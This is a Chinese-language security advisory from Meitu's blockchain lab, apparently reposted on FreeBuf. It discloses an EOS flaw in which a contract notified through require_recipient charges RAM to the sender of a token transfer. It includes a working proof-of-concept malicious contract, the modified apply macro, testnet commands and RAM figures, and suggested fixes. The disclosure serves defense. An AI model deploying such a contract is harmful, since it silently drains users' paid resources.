@@ -1,0 +1,354 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+##
+[概述](http://cf.meitu.com/confluence/pages/viewpage.action?pageId=63438509#%E6%A6%82%E8%BF%B0)
+
+ **2018年7月23日，美图区块链实验室发现EOS恶意合约可吞噬用户RAM的安全漏洞。**
+
+经过反复调试确认后，于7月24日将问题提交EOSIO官方，并就漏洞细节与官方团队进行了充分沟通。
+
+与此同时，考虑到各大交易所、钱包、空投方正处于这个漏洞的威胁之中，随时可能会被恶意利用，导致财产损失，美图区块链实验室决定负责任的对各相关方批漏这个漏洞信息。
+
+在美图区块链实验室公众号、慢雾区、freebuf等媒体提出警示，“警惕 | 恶意EOS合约存在吞噬用户RAM的安全风险”。
+
+在经过与官方团队一周的沟通之后，官方已经充分理解了漏洞危害，并决定将在后期再挑选合适方案，对这个漏洞进行代码修补。
+
+为了避免在这段真空期内发生恶意利用攻击，美图区块链实验室决定将漏洞细节公布出来，供社区研究参考，以方便自查和防御。
+
+EOS 的合约可以通过require_recipient触发调用其他合约，设计这样的机制给合约的开发者提供了很大的便利性，
+但是也带了新的问题，我们在测试中发现require_recipient 有可利用的漏洞导致RAM在不知情的情况下被滥用。
+
+某个用户给合约转账，合约可以在用户不知情的情况下消耗用户的RAM（下面的例子中可以消耗200多人民币的RAM）
+
+我们已经给EOS 官方提了issue：<https://github.com/EOSIO/eos/issues/4824> ，并得到官方的回应:
+
+> Contracts delegating action processing to other contracts have a trust
+> relationship with the other contracts. To prevent unexpected RAM
+> consumption, the best way is to control all of the relevant accounts and
+> contracts. A less attractive but possibly effective way is to only delegate
+> to verified open source contracts that have been frozen by dropping
+> ownership permissions.
+>
+> There have been discussions about how to provide relative certainty that you
+> can delegate to an arbitrary contract and still be assured there will be no
+> RAM consumption. Code has not yet been written and there is no schedule.
+> Watch future release notes.
+
+这一漏洞需要引起各大交易所，钱包，空投方，以及用户的注意
+
+在问题没有解决之前，用户应避免使用有大量RAM的账号给陌生账号转账
+
+##
+[问题分析](http://cf.meitu.com/confluence/pages/viewpage.action?pageId=63438509#%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90)
+
+在DAPP 的开发过程中， 为了获取转账信息， 一种方法是采用require_recipient来订阅转账通知， 原理是这样的:
+
+在系统合约eosio.token 的transfer 中， 转账时会分别通知from 和 to;
+
+如果账户to 本身是个合约账户， 并且也实现了相同的transfer 方法， 则这个to合约的transfer方法会被调用。
+
+    
+    
+    void token::transfer( account_name from,
+    
+                          account_name to,
+    
+                          asset        quantity,
+    
+                          string       memo )
+    
+    {
+    
+        eosio_assert( from != to, "cannot transfer to self" );
+    
+        require_auth( from );
+    
+        eosio_assert( is_account( to ), "to account does not exist");
+    
+        auto sym = quantity.symbol.name();
+    
+        stats statstable( _self, sym );
+    
+        const auto& st = statstable.get( sym );
+    
+        require_recipient( from );
+    
+        require_recipient( to );
+    
+        eosio_assert( quantity.is_valid(), "invalid quantity" );
+    
+        eosio_assert( quantity.amount > 0, "must transfer positive quantity" );
+    
+        eosio_assert( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
+    
+        eosio_assert( memo.size() <= 256, "memo has more than 256 bytes" );
+    
+        sub_balance( from, quantity );
+    
+        add_balance( to, quantity, from );
+    
+    }
+
+在自己的合约实现相同的transfer 方法:
+
+    
+    
+    void komo::transfer(account_name from, account_name to, asset quantity, std::string memo)
+    
+    {
+    
+      if (from == _self || to != _self) {
+    
+        return;
+    
+      }
+    
+      for (int i = 0; i < 100; i++) {
+    
+        // use from as payer！！
+    
+        _teams.emplace(from, [&](auto &t) {
+    
+          t.id = _teams.available_primary_key();
+    
+          t.name = from;
+    
+          t.total = quantity;
+    
+          t.big_dummy_str = std::string("wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww");
+    
+        });
+    
+      }
+    
+      return;
+    
+    }
+    
+    apply中允许eosio.token::transfer 触发调用。
+    
+    #define EOSIO_ABI_EX( TYPE, MEMBERS ) \
+    
+    extern "C" { \
+    
+        void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
+    
+            auto self = receiver; \
+    
+            if( action == N(onerror)) { \
+    
+                /* onerror is only valid if it is for the "eosio" code account and authorized by "eosio"'s "active permission */ \
+    
+                eosio_assert(code == N(eosio), "onerror action's are only valid from the \"eosio\" system account"); \
+    
+            } \
+    
+            if ((code == self || action == N(onerror)) || (code == N(eosio.token) && action == N(transfer)) ) { \
+    
+              TYPE thiscontract( self ); \
+    
+                switch( action ) { \
+    
+                    EOSIO_API( TYPE, MEMBERS ) \
+    
+                } \
+    
+             /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
+    
+            } \
+    
+        } \
+    
+    } \
+    
+    EOSIO_ABI_EX(komo, (transfer))
+
+这个流程看似没什么问题，但是却带了安全隐患，可以恶意消耗账号from 的RAM 资源。 在上面的例子中 komo::transfer 故意用账户from
+的授权写了很多无用的记录到state db， 而这个操作用户在授权eosio::transfer时是不知情的。
+
+##
+[验证](http://cf.meitu.com/confluence/pages/viewpage.action?pageId=63438509#%E9%AA%8C%E8%AF%81)
+
+在测试网络中分别创建3个账号， test11111111, test22222222, komo11111111(合约账户， 部署了上面的合约komo)
+
+测试之前查看 test11111111 RAM 资源
+
+    
+    
+    $ ./x_cleos.sh get account test11111111
+    
+    permissions:
+    
+         owner     1:    1 EOS61ErKWxHQF6AoSKRc5GJb2HmorQpsC6uciQq1kDiPcZVfHZAU5
+    
+            active     1:    1 EOS5eiF9mFxVqYG8Mjv7A2uE4ZDFAdqDQtrvgV3yWBGsiNz8LzZ5X
+    
+    memory:
+    
+         quota:      32.6 MiB    used:     107.5 KiB
+
+给普通账户 test22222222 转账
+
+    
+    
+    ./x_cleos.sh transfer -c eosio.token test11111111 test22222222 "1.0000 EOS"
+
+再次查看test11111111 RAM资源
+
+    
+    
+    $ ./x_cleos.sh get account test11111111
+    
+    permissions:
+    
+         owner     1:    1 EOS61ErKWxHQF6AoSKRc5GJb2HmorQpsC6uciQq1kDiPcZVfHZAU5
+    
+            active     1:    1 EOS5eiF9mFxVqYG8Mjv7A2uE4ZDFAdqDQtrvgV3yWBGsiNz8LzZ5X
+    
+    memory:
+    
+         quota:      32.6 MiB    use
+    
+    d:     107.5 KiB
+
+没有变化， 还是107.5 KiB；再给合约账户 komo11111111 转账
+
+    
+    
+    ./x_cleos.sh transfer -c eosio.token test11111111 komo11111111 "1.0000 EOS"
+
+再次查看test11111111 RAM资源， 发现被消耗了（142.2-107.5）= 34.7K 字节！ 原因是上面komo::transfer
+中的for 循环用账户test11111111的授权写了很多数据到state db
+
+    
+    
+    $ ./x_cleos.sh get account
+    
+     test1111
+    
+    1111
+    
+    permissions:
+    
+         owner     1:    1 EOS61ErKWxHQF6AoSKRc5GJb2HmorQpsC6uciQq1kDiPcZVfHZAU5
+    
+            active     1:    1 EOS5eiF9mFxVqYG8Mjv7A2uE4ZDFAdqDQtrvgV3yWBGsiNz8LzZ5X
+    
+    memory:
+    
+         quota:      32.6 MiB    used:     142.2 KiB
+
+##
+[代码分析](http://cf.meitu.com/confluence/pages/viewpage.action?pageId=63438509#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
+
+因为komo::transfer 这个handler 是被eosio.token::transfer 中的require_recipient 触发的，
+在代码中当前action 已有账户 from 的授权。 所以检查权限时不会报错。
+
+    
+    
+    void apply_context::update_db_usage( const account_name& payer, int64_t delta ) {
+    
+       if( delta > 0 ) {
+    
+          if( !(privileged || payer == account_name(receiver)) ) {
+    
+             require_authorization( payer );
+    
+          }
+    
+       }
+    
+       trx_context.add_ram_usage(payer, delta);
+    
+    }
+    
+    void apply_context::require_authorization( const account_name& account ) {
+    
+       for( uint32_t i=0; i < act.authorization.size(); i++ ) {
+    
+         if( act.authorization[i].actor == account ) {
+    
+            used_authorizations[i] = true;
+    
+            return;
+    
+         }
+    
+       }
+    
+       EOS_ASSERT( false, missing_auth_exception, "missing authority of ${account}", ("account",account));
+    
+    }
+
+并且我们发现， 只要维持这个数据结构占据的字节不变，这个窃取的RAM在komo合约中是可以一直使用的。
+
+    
+    
+    void apply_context::db_update_i64( int iterator, account_name payer, const char* buffer, size_t buffer_size ) {
+    
+       const key_value_object& obj = keyval_cache.get( iterator );
+    
+       const auto& table_obj = keyval_cache.get_table( obj.t_id );
+    
+       EOS_ASSERT( table_obj.code == receiver, table_access_violation, "db access violation" );
+    
+    //   require_write_lock( table_obj.scope );
+    
+       const int64_t overhead = config::billable_size_v<key_value_object>;
+    
+       int64_t old_size = (int64_t)(obj.value.size() + overhead);
+    
+       int64_t new_size = (int64_t)(buffer_size + overhead);
+    
+       if( payer == account_name() ) payer = obj.payer;
+    
+       if( account_name(obj.payer) != payer ) {
+    
+          // refund the existing payer
+    
+          update_db_usage( obj.payer,  -(old_size) );
+    
+          // charge the new payer
+    
+          update_db_usage( payer,  (new_size));
+    
+       } else if(old_size != new_size) {
+    
+          // charge/refund the existing payer the difference
+    
+          update_db_usage( obj.payer, new_size - old_size);
+    
+       }
+    
+       db.modify( obj, [&]( auto& o ) {
+    
+         o.value.resize( buffer_size );
+    
+         memcpy( o.value.data(), buffer, buffer_size );
+    
+         o.payer = payer;
+    
+       });
+    
+    }
+
+##
+[修复办法](http://cf.meitu.com/confluence/pages/viewpage.action?pageId=63438509#%E4%BF%AE%E5%A4%8D%E5%8A%9E%E6%B3%95)
+
+我们建议的修复办法是：在require_recipient触发action handler 执行时, 禁止被触发的handler 使用当前action
+的授权。
+
+被触发的 action handler 有存储要求怎么办？ 可以使用inline actions 来解决， inline action
+被执行时就不会用到原来action 的授权了。
+
+##
+[防御办法](http://cf.meitu.com/confluence/pages/viewpage.action?pageId=63438509#%E9%98%B2%E5%BE%A1%E5%8A%9E%E6%B3%95)
+
+请参考我们之前发布的漏洞预警信息。
+
+> <http://www.freebuf.com/vuls/178812.html><
+>
+> 美图区块链实验室 _&_ 美图安全应急响应中心联合声明
+
+ ***本文作者：美图安全应急响应中心，转载请注明来自FreeBuf.COM**
+
